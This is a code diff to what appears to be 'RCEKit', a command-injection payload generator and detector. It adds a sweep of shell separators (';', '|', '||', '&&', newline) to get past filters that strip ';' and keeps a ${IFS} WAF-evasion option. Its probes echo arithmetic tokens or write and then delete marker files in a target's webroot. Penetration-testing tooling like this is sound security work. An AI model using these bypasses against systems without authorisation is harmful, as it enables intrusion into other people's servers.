@@ -26,9 +26,16 @@ logger = logging.getLogger(__name__)
 
 # Bump on every change: PATCH for fixes, MINOR for new capabilities, MAJOR for
 # breaking changes to the CLI, output formats, or template schema.
-__version__ = "2.18.0"
+__version__ = "2.19.0"
 
 SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}
+
+# Contexts whose break-out prefix already ends in a command separator (``'; ``,
+# ``"; ``). Prepending another one yields ``'; ; cmd`` -- a shell syntax error
+# that silently costs the probe. Shared by the generator and the detection
+# engine: keeping it in one place is what stops the two from drifting apart,
+# as they did when only the generator carried the guard.
+SELF_SEPARATING_CONTEXTS = {"shell_single_quoted", "shell_double_quoted"}
 
 
 @dataclass(frozen=True)
@@ -535,7 +542,7 @@ class RCEKit:
         if context_name in self.transport_contexts:
             return True
         # Shell-quoted break-outs only make sense for shell runners.
-        if context_name in {"shell_single_quoted", "shell_double_quoted"}:
+        if context_name in SELF_SEPARATING_CONTEXTS:
             return env in {"unix", "docker", "kubernetes"}
         if raw_context_only:
             if env == "php":
@@ -752,7 +759,7 @@ class RCEKit:
         variants = [payload]
         # Shell-quoted break-out contexts already supply their own separator, so
         # prepending an env separator would produce ";;" style syntax errors.
-        if env in self.separator_envs and context_name not in {"shell_single_quoted", "shell_double_quoted"}:
+        if env in self.separator_envs and context_name not in SELF_SEPARATING_CONTEXTS:
             variants = [f"{separator}{payload}" for separator in self.separators[env]]
             variants.append(payload)
 
@@ -917,7 +924,7 @@ class RCEKit:
         """
         if environment not in self.separator_envs:
             return True  # non-shell sinks are not command-concatenation points
-        if context in {"shell_single_quoted", "shell_double_quoted"}:
+        if context in SELF_SEPARATING_CONTEXTS:
             return True  # quote break-outs supply their own separator
         return core.startswith(self.command_separators)
 
@@ -2218,17 +2225,51 @@ class DetectionMethod:
         blurring into an adjacent digit run (e.g. an arithmetic result)."""
         return "RK" + "".join(rng.choice(string.ascii_uppercase) for _ in range(5))
 
-    def _wrap(self, record: "PayloadRecord", core: str, windows: bool = False,
-              evade: bool = True) -> str:
-        """Break out of the running command with a separator, then escape the
-        probe for the record's serialization context — reusing the same
-        context/escape machinery the generator uses for every other payload.
+    # Command separators a probe tries in order to break out of the command it
+    # was concatenated into. A sink that strips ';' -- the single most common
+    # partial mitigation in the wild -- is still reachable through a pipe, a
+    # chain operator or a newline, so a probe that only ever tries ';' reports
+    # a genuinely exploitable target as negative.
+    #
+    # '||' earns its place next to '&&': the injected input is appended to a
+    # command whose exit status is unknown, and only one of the two fires for
+    # any given outcome. The newline is a real "\n", not the generator's %0a:
+    # the live delivery layer percent-encodes each probe for its injection
+    # point, which would turn a literal %0a into %250a and hand the sink the
+    # text rather than the line break.
+    DEFAULT_SEPARATORS = {
+        "unix": ("; ", "| ", "|| ", "&& ", "\n"),
+        "windows": (" & ", " | ", " || ", " && "),
+    }
 
-        With ``--sink-raw`` (``config['sink_raw']``) the injected input is
-        executed as the *whole* command — a ``qx/$input/``-style sink with no
-        surrounding command to break out of — so no separator is prepended; a
-        leading ``;``/``&`` would be a shell syntax error there. The probe is
-        sent as a bare command instead.
+    def _separators(self, windows: bool) -> Tuple[str, ...]:
+        """The separators to sweep, from ``--separators`` when given."""
+        configured = self.config.get("separators")
+        if configured:
+            return tuple(configured)
+        return self.DEFAULT_SEPARATORS["windows" if windows else "unix"]
+
+    def _needs_separator(self, record: "PayloadRecord") -> bool:
+        """Whether a probe for this record must supply its own separator.
+
+        Two cases must not get one. With ``--sink-raw`` the injected input is
+        executed as the *whole* command (a ``qx/$input/``-style sink with no
+        surrounding command to break out of), so a leading ``;`` is a syntax
+        error. And a shell-quoted context's prefix already ends in one, so
+        adding another produced ``'; ; cmd`` -- the generator has guarded that
+        since it was found there; the detection engine had not, which made the
+        one context genuinely fitting a quoted sink the one that could not
+        confirm on it."""
+        return not (self.config.get("sink_raw")
+                    or record.context in SELF_SEPARATING_CONTEXTS)
+
+    def _wrap_variants(self, record: "PayloadRecord", core: str, windows: bool = False,
+                       evade: bool = True) -> List[str]:
+        """One ready-to-send payload per candidate separator: break out of the
+        running command, then escape for the record's serialization context —
+        reusing the same context/escape machinery the generator uses for every
+        other payload. Returns a single bare-command payload where no separator
+        applies (see :meth:`_needs_separator`).
 
         With ``--evade low`` and ``evade=True``, apply a single low-touch WAF
         transform to Unix command probes — substitute ``${IFS}`` for spaces —
@@ -2236,13 +2277,25 @@ class DetectionMethod:
         minimal, not aggressive/noisy evasion. Callers whose command uses a
         redirect (``>``) pass ``evade=False``: ``${IFS}`` around ``>`` yields an
         ambiguous redirect, so those stay canonical."""
-        if self.config.get("sink_raw"):
-            body = core
+        if self._needs_separator(record):
+            bodies = [f"{separator}{core}" for separator in self._separators(windows)]
         else:
-            body = f"{' & ' if windows else '; '}{core}"
-        if evade and not windows and self.config.get("evade") == "low":
-            body = body.replace(" ", "${IFS}")
-        return self._wrap_context(record, body)
+            bodies = [core]
+        payloads: List[str] = []
+        for body in bodies:
+            if evade and not windows and self.config.get("evade") == "low":
+                body = body.replace(" ", "${IFS}")
+            payloads.append(self._wrap_context(record, body))
+        return payloads
+
+    def _wrap(self, record: "PayloadRecord", core: str, windows: bool = False,
+              evade: bool = True) -> str:
+        """The first :meth:`_wrap_variants` payload — one separator only.
+
+        For methods that cannot sweep: an aggregate method reads a whole probe
+        series as one measurement, so mixing separators through it would blend
+        a working break-out with broken ones and destroy the signal."""
+        return self._wrap_variants(record, core, windows, evade)[0]
 
     def _wrap_context(self, record: "PayloadRecord", body: str) -> str:
         """Escape ``body`` for the record's serialization context and apply the
@@ -2282,29 +2335,21 @@ class ReflectedMath(DetectionMethod):
             # output so the computed value lands in the response.
             arith = f"set /a {a}+{b}"
             core = f'for /f "delims=" %i in (\'{arith}\') do @echo {t1}%i{t2}'
-            probes.append(Probe(
-                payload=self._wrap(record, core, windows=True),
-                expected=f"{t1}{total}{t2}",
-                forbidden=arith,
-            ))
+            probes.extend(Probe(payload=payload, expected=f"{t1}{total}{t2}", forbidden=arith)
+                          for payload in self._wrap_variants(record, core, windows=True))
         else:
             # $(( )) arithmetic + $() substitution collapse, one probe.
             arith = f"$(({a}+{b}))"
             core = f"echo {t1}{arith}{t2}$(echo {t3}){t1}"
-            probes.append(Probe(
-                payload=self._wrap(record, core),
-                expected=f"{t1}{total}{t2}{t3}{t1}",
-                forbidden=arith,
-            ))
+            probes.extend(Probe(payload=payload, expected=f"{t1}{total}{t2}{t3}{t1}",
+                                forbidden=arith)
+                          for payload in self._wrap_variants(record, core))
             # Backtick variant: same proof via a different substitution syntax,
             # so a sink that strips `$(` is still reached.
             bt = f"`expr {a} + {b}`"
             core_bt = f"echo {t1}{bt}{t2}"
-            probes.append(Probe(
-                payload=self._wrap(record, core_bt),
-                expected=f"{t1}{total}{t2}",
-                forbidden=bt,
-            ))
+            probes.extend(Probe(payload=payload, expected=f"{t1}{total}{t2}", forbidden=bt)
+                          for payload in self._wrap_variants(record, core_bt))
         return probes
 
     def confirm(self, obs: "Observation", probe: "Probe") -> Verdict:
@@ -2333,24 +2378,32 @@ class FileBased(DetectionMethod):
     def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
         webroot = self.config["webroot"].rstrip("/")
         base = self.config["web_base_url"].rstrip("/")
-        name = "rcekit-" + "".join(rng.choice(string.ascii_lowercase + string.digits)
-                                   for _ in range(12)) + ".txt"
-        token = self._tag(rng) + "".join(rng.choice(string.ascii_uppercase + string.digits)
-                                         for _ in range(10))
         windows = record.environment == "windows"
-        if windows:
-            write_path = f"{webroot}\\{name}"
-            core = f"echo {token}>{write_path}"
-            cleanup = f"del {write_path}"
-        else:
-            write_path = f"{webroot}/{name}"
-            core = f"echo {token} > {write_path}"
-            cleanup = f"rm -f {write_path}"
-        followup = {"url": f"{base}/{name}", "cleanup": cleanup, "path": write_path}
-        # The write uses a `>` redirect, which ${IFS} would turn into an ambiguous
-        # redirect, so this probe stays canonical even under --evade low.
-        return [Probe(payload=self._wrap(record, core, windows=windows, evade=False),
-                      expected=token, forbidden=None, followup=followup)]
+        probes: List[Probe] = []
+        # One filename and token per separator. Sharing them would make every
+        # probe's followup succeed as soon as any one separator wrote the file,
+        # so a confirmation could not say which break-out actually worked -- and
+        # its cleanup command would name a file another probe wrote.
+        for separator in (self._separators(windows) if self._needs_separator(record) else (None,)):
+            name = "rcekit-" + "".join(rng.choice(string.ascii_lowercase + string.digits)
+                                       for _ in range(12)) + ".txt"
+            token = self._tag(rng) + "".join(rng.choice(string.ascii_uppercase + string.digits)
+                                             for _ in range(10))
+            if windows:
+                write_path = f"{webroot}\\{name}"
+                core = f"echo {token}>{write_path}"
+                cleanup = f"del {write_path}"
+            else:
+                write_path = f"{webroot}/{name}"
+                core = f"echo {token} > {write_path}"
+                cleanup = f"rm -f {write_path}"
+            body = core if separator is None else f"{separator}{core}"
+            followup = {"url": f"{base}/{name}", "cleanup": cleanup, "path": write_path}
+            # The write uses a `>` redirect, which ${IFS} would turn into an
+            # ambiguous redirect, so this probe stays canonical under --evade low.
+            probes.append(Probe(payload=self._wrap_context(record, body),
+                                expected=token, forbidden=None, followup=followup))
+        return probes
 
     def confirm(self, obs: "Observation", probe: "Probe") -> Verdict:
         if obs.status is None:
@@ -2862,6 +2915,13 @@ def main():
                              "positives — assumes authorised, WAF-free access. 'low' applies a single "
                              "low-touch transform (${IFS} for spaces on Unix); deliberately minimal, not "
                              "aggressive evasion.")
+    parser.add_argument("--separators", default=None,
+                        help="(--methods) Comma-separated command separators the shell probes try to "
+                             "break out with, e.g. \"; ,| ,&& \". Default sweeps '; ', '| ', '|| ', "
+                             "'&& ' and a newline, so a sink that filters ';' is still reached; "
+                             "write a newline as \\n. Narrow it (e.g. --separators '; ') to cut the "
+                             "request count when the sink's shape is already known. Ignored with "
+                             "--sink-raw, which sends bare commands.")
     parser.add_argument("--methods", default=None,
                         help="Comma-separated RCE detection methods to run against --verify-url/-r instead of "
                              "the classic per-payload oracle. Available: reflected (results-based execution "
@@ -2975,6 +3035,11 @@ def main():
     sink_raw = bool(from_profile(args.sink_raw, "sink_raw"))
     blind = bool(from_profile(args.sink_blind, "sink_blind"))
     sink_decodes = from_profile(args.sink_decodes, "sink_decodes") or []
+    # Separators the shell probes break out with. A profile may carry them as a
+    # list; the CLI takes a comma-separated string with \n for a newline.
+    separators = from_profile(args.separators, "separators")
+    if isinstance(separators, str):
+        separators = [s.replace("\\n", "\n") for s in separators.split(",") if s]
     # A profile `request` block shapes the exported Burp/Nuclei requests.
     request_template = profile.get("request")
 
@@ -3197,7 +3262,7 @@ def main():
                 return 1
             detection_config = {"webroot": args.webroot, "web_base_url": args.web_base_url,
                                 "time_base": args.time_base, "evade": args.evade,
-                                "sink_raw": sink_raw}
+                                "sink_raw": sink_raw, "separators": separators}
             if "file" in method_names:
                 if not (args.webroot and args.web_base_url):
                     print("[!] --methods file writes a file to the target and fetches it back, so it "
